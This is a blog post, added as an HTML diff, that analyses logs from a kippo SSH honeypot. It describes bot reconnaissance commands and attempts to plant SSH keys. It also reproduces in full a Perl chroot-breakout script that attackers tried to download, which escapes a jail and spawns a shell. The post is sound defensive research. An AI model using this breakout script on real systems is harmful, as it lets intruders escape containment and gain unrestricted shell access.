@@ -1,0 +1,303 @@
+<!doctype html>
+<html lang=en>
+<head>
+<!-- Latest compiled and minified CSS -->
+<!-- CC BY 3.0 -->
+<meta charset="utf-8">
+<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.1/css/bootstrap.min.css">
+
+<!-- Optional theme -->
+<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.1/css/bootstrap-theme.min.css">
+
+<!-- Latest compiled and minified JavaScript -->
+<script src="https://code.jquery.com/jquery-2.1.3.min.js"></script>
+<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.1/js/bootstrap.min.js"></script>
+
+<meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<style>
+/* Sticky footer styles
+-------------------------------------------------- */
+html {
+  position: relative;
+  min-height: 100%;
+}
+body {
+  /* Margin bottom by footer height */
+  margin-bottom: 60px;
+}
+.footer {
+  position: absolute;
+  bottom: 0;
+  width: 100%;
+  /* Set the fixed height of the footer here */
+  height: 60px;
+  background-color: #f5f5f5;
+}
+</style>
+<title>SSH Honeypot Analysis</title>
+
+</head>
+<body>
+<nav class="navbar navbar-default navbar-inverse">
+  <div class="container-fluid">
+    <!-- Brand and toggle get grouped for better mobile display -->
+    <div class="navbar-header">
+      <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#bs-example-navbar-collapse-1">
+        <span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+      <a class="navbar-brand listopen" href="http://spencerkrum.com/blog">Science Officer's Blog</a>
+    </div>
+
+    <!-- Collect the nav links, forms, and other content for toggling -->
+    <div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1">
+      <ul class="nav navbar-nav">
+        <li id="clear"><a href="#">SSH Honeypot Analysis</a></li>
+    </ul>
+      <ul class="nav navbar-nav navbar-right">
+        <li><a href="http://spencerkrum.com">By Spencer Krum</a></li>
+      </ul>
+    </div><!-- /.navbar-collapse -->
+  </div><!-- /.container-fluid -->
+</nav>
+<!--col-xs-6 col-centered -->
+
+<div class="container">
+<div class="page-header">
+<div class="panel panel-default">
+    <div class="panel-heading"> Sun Jan 25 21:41:41 PST 2015 </div>
+  <div class="panel-body ">
+    <br>
+    Last week we built an ssh honeypot out of the open source kippo project. Today we will analyze the results.
+    <br>
+    This will be part two of a two part post. In the first post we will set up the service, in this second post we will analyze the logs that were generated.
+    <br>
+    <br>
+    Basic stats:
+    <ul>
+        <li>Users who connected with the correct password: 136</li>
+        <li>Files downloaded with wget or curl: 11</li>
+    </ul>
+    Kippo stores the logs of the sessions that the user generated. We can do side band analysis first. The 'size' column shows us relatively how long the attacker stayed around. Inevitably, most attackers figured out this was a honeypot and went somewhere else.
+    <br>
+    <pre>
+    kippo@honeypot:~/kippo/log/tty$ ls -l 
+    total 235700
+    -rw------- 1 kippo kippo      4298 Jan 19 01:01 20150119-010112-8620.log
+    -rw------- 1 kippo kippo      5979 Jan 19 01:11 20150119-010717-9734.log
+    -rw------- 1 kippo kippo      1695 Jan 19 01:22 20150119-011153-6996.log
+    -rw------- 1 kippo kippo     14030 Jan 19 01:29 20150119-012525-8858.log
+    -rw------- 1 kippo kippo     14890 Jan 19 01:33 20150119-012638-8270.log
+    -rw------- 1 kippo kippo     49207 Jan 19 01:35 20150119-013109-1916.log
+    -rw------- 1 kippo kippo     73217 Jan 19 01:39 20150119-013434-3186.log
+    -rw------- 1 kippo kippo    267425 Jan 19 02:05 20150119-013631-3161.log
+    -rw------- 1 kippo kippo     49929 Jan 19 01:47 20150119-014005-135.log
+    -rw------- 1 kippo kippo    170290 Jan 19 02:41 20150119-020545-9161.log
+    -rw------- 1 kippo kippo     37290 Jan 19 03:09 20150119-025840-8964.log
+    -rw------- 1 kippo kippo      9644 Jan 19 03:19 20150119-031908-7075.log
+    -rw------- 1 kippo kippo 238811781 Jan 19 03:49 20150119-033120-5764.log
+    -rw------- 1 kippo kippo     16976 Jan 19 13:15 20150119-130438-6801.log
+    -rw------- 1 kippo kippo      8690 Jan 19 15:06 20150119-131518-7333.log
+    -rw------- 1 kippo kippo      3502 Jan 19 14:11 20150119-141053-6169.log
+    -rw------- 1 kippo kippo   1248611 Jan 19 16:13 20150119-155109-8347.log
+    -rw------- 1 kippo kippo       125 Jan 19 16:05 20150119-160552-9584.log
+    -rw------- 1 kippo kippo       125 Jan 19 16:06 20150119-160620-7215.log
+    -rw------- 1 kippo kippo       101 Jan 19 16:16 20150119-161619-2744.log
+    -rw------- 1 kippo kippo     15387 Jan 19 16:18 20150119-161713-5328.log
+    -rw------- 1 kippo kippo      1162 Jan 19 16:24 20150119-162402-1690.log
+    -rw------- 1 kippo kippo        94 Jan 19 20:31 20150119-203147-9413.log
+    -rw------- 1 kippo kippo        78 Jan 19 20:31 20150119-203152-5035.log
+    -rw------- 1 kippo kippo        94 Jan 19 20:31 20150119-203154-9371.log
+    -rw------- 1 kippo kippo       278 Jan 19 20:31 20150119-203158-4520.log
+    -rw------- 1 kippo kippo        94 Jan 19 20:32 20150119-203200-3418.log
+    -rw------- 1 kippo kippo      3017 Jan 19 20:32 20150119-203204-6076.log
+    -rw------- 1 kippo kippo        94 Jan 20 10:25 20150120-102531-3426.log
+    -rw------- 1 kippo kippo        78 Jan 20 10:25 20150120-102536-8502.log
+    -rw------- 1 kippo kippo        94 Jan 20 10:25 20150120-102538-357.log
+    -rw------- 1 kippo kippo       278 Jan 20 10:25 20150120-102542-7175.log
+    -rw------- 1 kippo kippo        94 Jan 20 10:25 20150120-102544-7361.log
+    -rw------- 1 kippo kippo      3017 Jan 20 10:25 20150120-102548-6352.log
+    -rw------- 1 kippo kippo        94 Jan 20 13:23 20150120-132328-7550.log
+    -rw------- 1 kippo kippo        78 Jan 20 13:23 20150120-132332-8490.log
+    -rw------- 1 kippo kippo        94 Jan 20 13:23 20150120-132333-8297.log
+    -rw------- 1 kippo kippo       278 Jan 20 13:23 20150120-132336-9228.log
+    -rw------- 1 kippo kippo        94 Jan 20 13:23 20150120-132337-9365.log
+    -rw------- 1 kippo kippo      3017 Jan 20 13:23 20150120-132341-3145.log
+    -rw------- 1 kippo kippo        94 Jan 20 17:14 20150120-171426-5514.log
+    -rw------- 1 kippo kippo        78 Jan 20 17:14 20150120-171430-2877.log
+    -rw------- 1 kippo kippo        94 Jan 20 17:14 20150120-171431-3069.log
+    -rw------- 1 kippo kippo       278 Jan 20 17:14 20150120-171435-7529.log
+    -rw------- 1 kippo kippo        94 Jan 20 17:14 20150120-171437-9970.log
+    -rw------- 1 kippo kippo      3017 Jan 20 17:14 20150120-171441-7580.log
+    -rw------- 1 kippo kippo        94 Jan 21 01:15 20150121-011521-4560.log
+    -rw------- 1 kippo kippo        78 Jan 21 01:15 20150121-011525-5051.log
+    -rw------- 1 kippo kippo        94 Jan 21 01:15 20150121-011526-7540.log
+    -rw------- 1 kippo kippo       278 Jan 21 01:15 20150121-011530-7680.log
+    -rw------- 1 kippo kippo        94 Jan 21 01:15 20150121-011532-3511.log
+    -rw------- 1 kippo kippo      3017 Jan 21 01:15 20150121-011536-5214.log
+    -rw------- 1 kippo kippo        94 Jan 21 09:29 20150121-092900-7498.log
+    -rw------- 1 kippo kippo        78 Jan 21 09:29 20150121-092905-7819.log
+    -rw------- 1 kippo kippo        94 Jan 21 09:29 20150121-092906-1145.log
+    -rw------- 1 kippo kippo       278 Jan 21 09:29 20150121-092911-1210.log
+    -rw------- 1 kippo kippo        94 Jan 21 09:29 20150121-092912-3318.log
+    -rw------- 1 kippo kippo      2993 Jan 21 09:29 20150121-092917-4668.log
+    -rw------- 1 kippo kippo        94 Jan 21 20:37 20150121-203716-5494.log
+    -rw------- 1 kippo kippo        78 Jan 21 20:37 20150121-203722-3433.log
+    -rw------- 1 kippo kippo        94 Jan 21 20:37 20150121-203725-9673.log
+    -rw------- 1 kippo kippo       278 Jan 21 20:37 20150121-203730-6531.log
+    -rw------- 1 kippo kippo        94 Jan 21 20:37 20150121-203732-6510.log
+    -rw------- 1 kippo kippo      3017 Jan 21 20:37 20150121-203738-9918.log
+    -rw------- 1 kippo kippo        94 Jan 22 02:57 20150122-025755-7107.log
+    -rw------- 1 kippo kippo        78 Jan 22 02:58 20150122-025801-770.log
+    -rw------- 1 kippo kippo        94 Jan 22 02:58 20150122-025803-779.log
+    -rw------- 1 kippo kippo       278 Jan 22 02:58 20150122-025808-7488.log
+    -rw------- 1 kippo kippo        94 Jan 22 02:58 20150122-025810-8757.log
+    -rw------- 1 kippo kippo      3017 Jan 22 02:58 20150122-025814-1830.log
+    -rw------- 1 kippo kippo        94 Jan 22 09:08 20150122-090845-5552.log
+    -rw------- 1 kippo kippo        78 Jan 22 09:08 20150122-090850-9357.log
+    -rw------- 1 kippo kippo        94 Jan 22 09:08 20150122-090852-7307.log
+    -rw------- 1 kippo kippo       278 Jan 22 09:08 20150122-090857-1679.log
+    -rw------- 1 kippo kippo        94 Jan 22 09:08 20150122-090859-8312.log
+    -rw------- 1 kippo kippo      3017 Jan 22 09:09 20150122-090903-3149.log
+    -rw------- 1 kippo kippo        94 Jan 22 13:50 20150122-135056-1693.log
+    -rw------- 1 kippo kippo        78 Jan 22 13:51 20150122-135100-1061.log
+    -rw------- 1 kippo kippo        94 Jan 22 13:51 20150122-135102-1199.log
+    -rw------- 1 kippo kippo       278 Jan 22 13:51 20150122-135106-2531.log
+    -rw------- 1 kippo kippo        94 Jan 22 13:51 20150122-135107-9775.log
+    -rw------- 1 kippo kippo      3017 Jan 22 13:51 20150122-135111-9168.log
+    -rw------- 1 kippo kippo        94 Jan 22 19:35 20150122-193505-2565.log
+    -rw------- 1 kippo kippo        78 Jan 22 19:35 20150122-193509-8746.log
+    -rw------- 1 kippo kippo        94 Jan 22 19:35 20150122-193510-6634.log
+    -rw------- 1 kippo kippo       278 Jan 22 19:35 20150122-193514-9281.log
+    -rw------- 1 kippo kippo        94 Jan 22 19:35 20150122-193516-8951.log
+    -rw------- 1 kippo kippo      3017 Jan 22 19:35 20150122-193521-2269.log
+    -rw------- 1 kippo kippo        94 Jan 23 04:41 20150123-044130-5797.log
+    -rw------- 1 kippo kippo        78 Jan 23 04:41 20150123-044135-2051.log
+    -rw------- 1 kippo kippo        94 Jan 23 04:41 20150123-044136-6945.log
+    -rw------- 1 kippo kippo       278 Jan 23 04:41 20150123-044140-3022.log
+    -rw------- 1 kippo kippo        94 Jan 23 04:41 20150123-044141-6596.log
+    -rw------- 1 kippo kippo      3017 Jan 23 04:41 20150123-044145-13.log
+    -rw------- 1 kippo kippo        94 Jan 23 09:07 20150123-090715-1734.log
+    -rw------- 1 kippo kippo        78 Jan 23 09:07 20150123-090719-2468.log
+    -rw------- 1 kippo kippo        94 Jan 23 09:07 20150123-090721-9809.log
+    -rw------- 1 kippo kippo       278 Jan 23 09:07 20150123-090725-2589.log
+    -rw------- 1 kippo kippo        94 Jan 23 09:07 20150123-090727-8389.log
+    -rw------- 1 kippo kippo      3017 Jan 23 09:07 20150123-090732-216.log
+    -rw------- 1 kippo kippo        94 Jan 23 10:10 20150123-101048-4442.log
+    -rw------- 1 kippo kippo        78 Jan 23 10:10 20150123-101052-3718.log
+    -rw------- 1 kippo kippo        94 Jan 23 10:10 20150123-101053-7304.log
+    -rw------- 1 kippo kippo       278 Jan 23 10:10 20150123-101058-7891.log
+    -rw------- 1 kippo kippo        94 Jan 23 10:10 20150123-101059-3278.log
+    -rw------- 1 kippo kippo      3017 Jan 23 10:11 20150123-101103-6156.log
+    -rw------- 1 kippo kippo        94 Jan 24 07:02 20150124-070250-782.log
+    -rw------- 1 kippo kippo        78 Jan 24 07:02 20150124-070254-8327.log
+    -rw------- 1 kippo kippo        94 Jan 24 07:02 20150124-070255-1312.log
+    -rw------- 1 kippo kippo       278 Jan 24 07:03 20150124-070300-9180.log
+    -rw------- 1 kippo kippo        94 Jan 24 07:03 20150124-070302-6234.log
+    -rw------- 1 kippo kippo      3017 Jan 24 07:03 20150124-070306-6379.log
+    -rw------- 1 kippo kippo        94 Jan 24 19:36 20150124-193649-7123.log
+    -rw------- 1 kippo kippo        78 Jan 24 19:36 20150124-193654-813.log
+    -rw------- 1 kippo kippo        94 Jan 24 19:36 20150124-193655-4837.log
+    -rw------- 1 kippo kippo       278 Jan 24 19:37 20150124-193659-8851.log
+    -rw------- 1 kippo kippo        94 Jan 24 19:37 20150124-193700-3591.log
+    -rw------- 1 kippo kippo      3017 Jan 24 19:37 20150124-193704-9907.log
+    -rw------- 1 kippo kippo        94 Jan 25 02:59 20150125-025941-6425.log
+    -rw------- 1 kippo kippo        78 Jan 25 02:59 20150125-025946-9848.log
+    -rw------- 1 kippo kippo        94 Jan 25 02:59 20150125-025947-2112.log
+    -rw------- 1 kippo kippo        94 Jan 25 02:59 20150125-025951-2917.log
+    -rw------- 1 kippo kippo       278 Jan 25 02:59 20150125-025951-5460.log
+    -rw------- 1 kippo kippo      3017 Jan 25 02:59 20150125-025955-315.log
+    -rw------- 1 kippo kippo        94 Jan 25 12:08 20150125-120851-5600.log
+    -rw------- 1 kippo kippo        78 Jan 25 12:08 20150125-120856-4114.log
+    -rw------- 1 kippo kippo        94 Jan 25 12:08 20150125-120858-523.log
+    -rw------- 1 kippo kippo       278 Jan 25 12:09 20150125-120902-5408.log
+    -rw------- 1 kippo kippo        94 Jan 25 12:09 20150125-120903-7464.log
+    -rw------- 1 kippo kippo      3017 Jan 25 12:09 20150125-120907-4784.log
+    -rw------- 1 kippo kippo        94 Jan 25 12:56 20150125-125607-6437.log
+    -rw------- 1 kippo kippo        78 Jan 25 12:56 20150125-125611-9444.log
+    -rw------- 1 kippo kippo        94 Jan 25 12:56 20150125-125613-104.log
+    -rw------- 1 kippo kippo       278 Jan 25 12:56 20150125-125617-5069.log
+    -rw------- 1 kippo kippo        94 Jan 25 12:56 20150125-125619-8821.log
+    -rw------- 1 kippo kippo      3017 Jan 25 12:56 20150125-125623-8918.log
+    </pre>
+
+    <br>
+    I was able to view the early larger logs. These were all myself and my friends poking at the server trying to break out of it and have fun. Not much for diagnostics.
+    <br>
+    We can see that the 3017, 94, and 278 size logs are the most predominant.
+    The 278 size log bot ran the 'free -m ' command and bailed right after. I'm not sure if it found my little server too small a target to bother going forward, or it detected the honeypot status from looking at the memory. This is what the log looks like there:
+    <pre>
+     total       used       free     shared    buffers     cached
+     Mem:           242        238          3          0         15         64
+     -/+ buffers/cache:        159         83
+     Swap:          342         76        266
+    </pre>
+    <br>
+    The 3017 log interogates the process table with 'ps -x' before bailing. From looking at the output, I probably would too. I won't reproduce it here, but nothing interesting is going on in this smaller environment. At least the word 'kippo' doesn't exist in the process table :grin:.
+    <br>
+    A couple more interesting attackers attempted to pull down ssh keys to put in .ssh/authorized_keys. The nature of the honeypot is that it spawns a new virtual filesystem on every connection, so this is a totally impotent attack. It is unfortunate that the honeypot doesn't have the ability to pretend to accept ssh keys, if it had then we would be able to see what the attackers were planning to do.
+    <br>
+    A couple attackers identified the limited environment they were in and tried to break out. There are numerous attempts to pull down a busybox binary to bring some utility to the restricted shell available to them in the honeypot. There are also some attempts to pull down a get_root.pl script. I will reproduce it here:
+    <br>
+    <pre>
+#!/usr/bin/perl -w
+use strict;
+# unchroot.pl Dec 2007
+# http://pentestmonkey.net/blog/chroot-breakout-perl
+
+# This script may be used for legal purposes only.
+
+# Go to the root of the jail
+chdir "/";
+
+# Open filehandle to root of jail
+opendir JAILROOT, "." or die "ERROR: Couldn't get file handle to root of jailn";
+
+# Create a subdir, move into it
+mkdir "mysubdir";
+chdir "mysubdir";
+
+# Lock ourselves in a new jail
+chroot ".";
+
+# Use our filehandle to get back to the root of the old jail
+chdir(*JAILROOT);
+
+# Get to the real root
+while ((stat("."))[0] != (stat(".."))[0] or (stat("."))[1] != (stat(".."))[1]) {
+        chdir "..";
+        }
+
+        # Lock ourselves in real root - so we're not really in a jail at all now
+        chroot ".";
+
+        # Start an un-jailed shell
+        system("/bin/sh");
+</pre>
+     <br>
+     This script assumes it has found itself on a chroot or jail(a freebsdism) system, the kippo system uses a different subsystem for isolation and so this can never work. But it is cool to read and think about.
+     <br>
+     Overall this process was less exciting than I had hoped. Kippo is too well known to attackers to get real results. I think the name of the game in honeypoting (and maybe security in general) is to play your cards close to the chest. Instead of the open source ethos of sharing everything always, I need to write my own honeypot system and never share it with anyone. With tools like docker and jetpack making this easier every day, it is a real possibility that I might do this. But I won't commit to doing it now.
+
+
+  </div>
+</div>
+</div>
+</div>
+
+
+<!--    <img src=cc.png width=201 height=70> -->
+
+<footer class="footer">
+  <div class="container">
+    <p class="text-muted"><img src=cc.png width=87 height=30>  © Spencer Krum. Released under the Creative Commons CC-BY Liscense </p>
+  </div>
+</footer>
+
+</body>
+</html>
+
